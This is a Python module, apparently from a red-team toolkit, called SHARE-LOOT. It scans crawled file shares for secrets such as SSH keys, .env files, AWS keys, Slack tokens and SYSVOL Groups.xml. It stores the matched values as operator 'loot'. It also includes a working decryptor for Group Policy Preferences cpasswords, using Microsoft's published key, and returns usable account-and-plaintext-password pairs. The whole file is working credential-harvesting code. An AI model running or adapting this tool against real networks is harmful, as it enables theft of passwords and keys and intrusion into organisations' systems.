"""SHARE-LOOT S3 — the curated, secrets-first loot rule pack + scanner.

Two rule kinds, applied to a crawled file:
- FILENAME rules match the (lower-cased) path/basename -> a presence finding, and a
  ``fetch`` flag marking the file worth reading for CONTENT rules.
- CONTENT rules match the fetched bytes -> a content finding.

A finding is PRESENCE + LOCATION + CATEGORY only. The matched secret VALUE/context is
NEVER returned for a receipt -- it is handed back separately for the operator's
out-of-band store (the loot). Categories are public labels; they never embed a value.

Design: high-signal, low-false-positive (owner: "curated secrets-first"); a broad pack
is a future opt-in rule set. Rules are data, so the pack is swappable/extensible.
"""
from __future__ import annotations

import re
from typing import NamedTuple, Optional


class Finding(NamedTuple):
    category: str          # public label, e.g. "ssh_private_key" / "gpp_cpassword"
    match_type: str        # "filename" | "content"
    detail: str            # OPERATOR-STORE ONLY redacted context (never put in a receipt)


# ---- FILENAME rules: (compiled regex over the lower-cased path, category, fetch?) ----
_FILENAME_RULES: list[tuple[re.Pattern, str, bool]] = [
    (re.compile(r"(^|[\\/])id_(rsa|dsa|ecdsa|ed25519)$"), "ssh_private_key", True),
    (re.compile(r"\.ppk$"), "putty_private_key", True),
    (re.compile(r"\.kdbx?$"), "keepass_db", False),                 # binary/large -> presence only
    (re.compile(r"\.(pfx|p12)$"), "pkcs12_bundle", False),
    (re.compile(r"\.(pem|key)$"), "private_key_file", True),
    (re.compile(r"(^|[\\/])(auto)?unattend\.xml$|(^|[\\/])sysprep\.(inf|xml)$"), "windows_unattend", True),
    (re.compile(r"(^|[\\/])web\.config$|(^|[\\/])app\.config$"), "dotnet_config", True),
    (re.compile(r"(^|[\\/])\.env$|(^|[\\/])\.env\."), "dotenv", True),
    (re.compile(r"(^|[\\/])groups\.xml$"), "gpp_groups", True),     # SYSVOL GPP cpassword
    (re.compile(r"(^|[\\/])\.aws[\\/]credentials$|(^|[\\/])\.git-credentials$"), "cloud_or_vcs_creds", True),
    (re.compile(r"(^|[\\/])vnc\.ini$|\.rdp$|(^|[\\/])\.pgpass$|(^|[\\/])\.my\.cnf$"), "service_config_creds", True),
    (re.compile(r"(password|passwd|secret|creds|credential)"), "suggestive_name", True),
]

# ---- CONTENT rules: (compiled bytes regex, category) -- high-signal ----
_CONTENT_RULES: list[tuple[re.Pattern, str]] = [
    (re.compile(rb"-----BEGIN (?:RSA |EC |OPENSSH |DSA |ENCRYPTED )?PRIVATE KEY-----"), "private_key_block"),
    (re.compile(rb'cpassword\s*=\s*"[^"]+"'), "gpp_cpassword"),
    (re.compile(rb"(?i)\bAKIA[0-9A-Z]{16}\b"), "aws_access_key_id"),
    (re.compile(rb"(?i)aws_secret_access_key\s*[=:]\s*\S{20,}"), "aws_secret_access_key"),
    (re.compile(rb"(?i)(connection ?string|data source|initial catalog)[^\n]{0,120}?\b(password|pwd)\s*="), "db_connection_string"),
    (re.compile(rb"(?i)\b(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token)\b\s*[=:]\s*\S{8,}"), "api_token"),
    (re.compile(rb"xox[baprs]-[0-9A-Za-z-]{10,}"), "slack_token"),
    # match prefixed fields too (db_password=, user_passwd:, pwd=) -- no leading \b,
    # require a 2+ char value so a bare "password=" placeholder is not a hit.
    (re.compile(rb"(?i)pass(?:word|wd)?\s*[=:]\s*\S{2,}"), "password_assignment"),
]

# file-extension hint: skip CONTENT-scanning obvious binaries we don't fetch by name
_BINARY_EXT = re.compile(r"\.(exe|dll|msi|cab|zip|7z|gz|tar|png|jpe?g|gif|ico|pdf|mp[34]|avi|iso|vhdx?|vmdk)$")


def filename_findings(path: str) -> list[Finding]:
    """Presence findings from the path/name alone (the detail is OPERATOR-STORE ONLY)."""
    low = (path or "").lower()
    out: list[Finding] = []
    for rx, cat, _fetch in _FILENAME_RULES:
        if rx.search(low):
            out.append(Finding(cat, "filename", detail=path))     # raw path -> store only
    return out


def should_fetch(path: str, size: int, max_file_bytes: int) -> bool:
    """Fetch a file for content scanning when a FILENAME rule marks it fetch-worthy
    and it is within the per-file byte cap and not an obvious binary we don't want."""
    if size <= 0 or size > max_file_bytes:
        return False
    low = (path or "").lower()
    if _BINARY_EXT.search(low):
        return False
    return any(fetch and rx.search(low) for rx, _cat, fetch in _FILENAME_RULES)


# ---- S4: usable-credential extraction (GPP cpassword decrypt) ----
# The GPP AES-256 key Microsoft published (MS14-025 / KB2962486) -- GPP cpasswords
# are decryptable by anyone, which is the whole point of the finding.
_GPP_KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
# userName/accountName/runAs + cpassword in a GPP XML (Groups/Services/ScheduledTasks/
# DataSources/Printers), in EITHER attribute order.
_RE_GPP_CRED = re.compile(
    rb'(?:userName|accountName|runAs)="([^"]*)"[^>]{0,400}?cpassword="([^"]+)"'
    rb'|cpassword="([^"]+)"[^>]{0,400}?(?:userName|accountName|runAs)="([^"]*)"', re.I)


def _aes_cbc_decrypt(key: bytes, iv: bytes, ct: bytes):
    """AES-256-CBC decrypt via whatever crypto backend is present (portable)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
        return d.update(ct) + d.finalize()
    except Exception:
        pass
    for mod in ("Cryptodome.Cipher", "Crypto.Cipher"):
        try:
            AES = __import__(mod, fromlist=["AES"]).AES
            return AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
        except Exception:
            continue
    return None


def gpp_decrypt(cpassword: str) -> Optional[str]:
    """Decrypt a GPP ``cpassword`` to its plaintext, or ``None``. Deterministic."""
    import base64
    try:
        s = (cpassword or "").strip()
        m = len(s) % 4
        if m:
            s += "=" * (4 - m)
        ct = base64.b64decode(s)
        if not ct or len(ct) % 16:
            return None
        dec = _aes_cbc_decrypt(_GPP_KEY, b"\x00" * 16, ct)
        if not dec:
            return None
        pad = dec[-1]
        if 1 <= pad <= 16:
            dec = dec[:-pad]
        out = dec.decode("utf-16-le", "ignore")
        return out or None
    except Exception:
        return None


class Credential(NamedTuple):
    principal: str         # the account the looted credential is FOR
    secret: str            # the recovered plaintext (OPERATOR-STORE / in-memory only)
    source: str            # e.g. "gpp_cpassword"


def extract_credentials(path: str, data: bytes) -> list[Credential]:
    """Parse USABLE (principal, secret) credentials from a fetched file -- today the
    GPP ``cpassword`` case (decryptable to a named account's password). The secret is
    OPERATOR-STORE / in-memory ONLY; it never reaches a receipt."""
    out: list[Credential] = []
    for m in _RE_GPP_CRED.finditer(data or b""):
        user = (m.group(1) or m.group(4) or b"").decode("utf-8", "ignore").strip()
        cpw = (m.group(2) or m.group(3) or b"").decode("utf-8", "ignore").strip()
        pw = gpp_decrypt(cpw)
        if pw:
            out.append(Credential(user or "(unknown)", pw, "gpp_cpassword"))
    return out


def content_findings(data: bytes) -> list[Finding]:
    """Content findings over fetched bytes. ``detail`` is a SHORT redacted context
    for the operator store -- it may contain secret material and must NEVER reach a
    receipt. Capped per match so a huge blob can't bloat the store."""
    out: list[Finding] = []
    if not data:
        return out
    for rx, cat in _CONTENT_RULES:
        m = rx.search(data)
        if m:
            start = max(0, m.start() - 24)
            ctx = data[start:m.end() + 96]            # enough context to carry the value for the operator
            try:
                detail = ctx.decode("utf-8", "replace")
            except Exception:
                detail = repr(ctx[:160])
            out.append(Finding(cat, "content", detail=detail[:256]))
    return out
